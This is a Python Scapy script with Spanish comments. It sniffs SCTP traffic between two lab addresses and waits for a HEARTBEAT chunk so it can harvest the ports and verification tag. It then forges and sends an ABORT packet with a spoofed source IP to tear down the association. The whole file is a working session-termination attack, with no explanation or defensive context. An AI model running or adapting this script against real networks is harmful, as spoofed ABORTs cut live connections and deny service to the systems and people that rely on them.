from scapy.all import *

# Constantes para las direcciones IP
IP_SRC = "10.10.10.7"  # Node C
IP_DST = "10.10.10.155"  # Node S

# Función para verificar HEARTBEAT
'''
def is_heartbeat_packet(pkt):
    if SCTP in pkt and IP in pkt:
        sctp_layer = pkt[SCTP]
        if hasattr(sctp_layer.payload, "chunk_type"):
            return ((sctp_layer.payload.chunk_type == 4) and
                    (pkt[IP].src == IP_SRC) and 
                    (pkt[IP].dst == IP_DST))
    return False
'''

def is_heartbeat_packet(pkt):
    chunk = pkt[SCTP].payload

    if isinstance(chunk, SCTPChunkHeartbeatReq):
        return True
    elif isinstance(chunk, Raw):
        try:
            decoded = SCTPChunk(chunk.load)
            return isinstance(decoded, SCTPChunkHeartbeatReq)
        except:
            return False
    return False


# Función para mostrar el paquete
def show_pkt(pkt):
    pkt.show()

# Step 1: Capturar un paquete HEARTBEAT
print(f"Monitoring network for SCTP HEARTBEAT packet from {IP_SRC} to {IP_DST}...")
# packets = sniff(filter="sctp", prn=show_pkt, stop_filter=is_heartbeat_packet, count=1)
packets = sniff(
    filter=f"sctp and src host {IP_SRC} and dst host {IP_DST}",
    prn=lambda x: x,
    stop_filter=is_heartbeat_packet,
    count=1
)

if not packets:
    print("No HEARTBEAT packet captured. Exiting.")
    exit(1)

# Extraer el primer paquete capturado
heartbeat_pkt = packets[0]

# Extraer y mostrar datos relevantes
src_ip = heartbeat_pkt[IP].src
dst_ip = heartbeat_pkt[IP].dst
src_port = heartbeat_pkt[SCTP].sport
dst_port = heartbeat_pkt[SCTP].dport
vtag = heartbeat_pkt[SCTP].tag

print("\nCaptured HEARTBEAT packet details:")
print(f"Source IP: {src_ip}")
print(f"Destination IP: {dst_ip}")
print(f"Source Port: {src_port}")
print(f"Destination Port: {dst_port}")
print(f"Verification Tag: {vtag:#010x}")

# Construir el paquete ABORT con "Don't Fragment"
abort_pkt = (
    IP(src=IP_SRC, dst=IP_DST, id=0x0000, flags="DF") /
    SCTP(sport=src_port, dport=dst_port, tag=vtag) /
    SCTPChunkAbort()
)

print("\nABORT packet parameters:")
print(f"Source IP: {IP_SRC} (spoofed as Node C)")
print(f"Destination IP: {IP_DST} (Node S)")
print(f"Source Port: {src_port}")
print(f"Destination Port: {dst_port}")
print(f"Verification Tag: {vtag:#010x}")
print("IP Identification: 0x0000")
print("IP Flags: 0x2 (Don't Fragment)")
print("Chunk Type: ABORT")

# Enviar el paquete ABORT
print(f"\nSending ABORT packet to Node S ({IP_DST})...")
send(abort_pkt, verbose=False)
print("ABORT packet sent.")
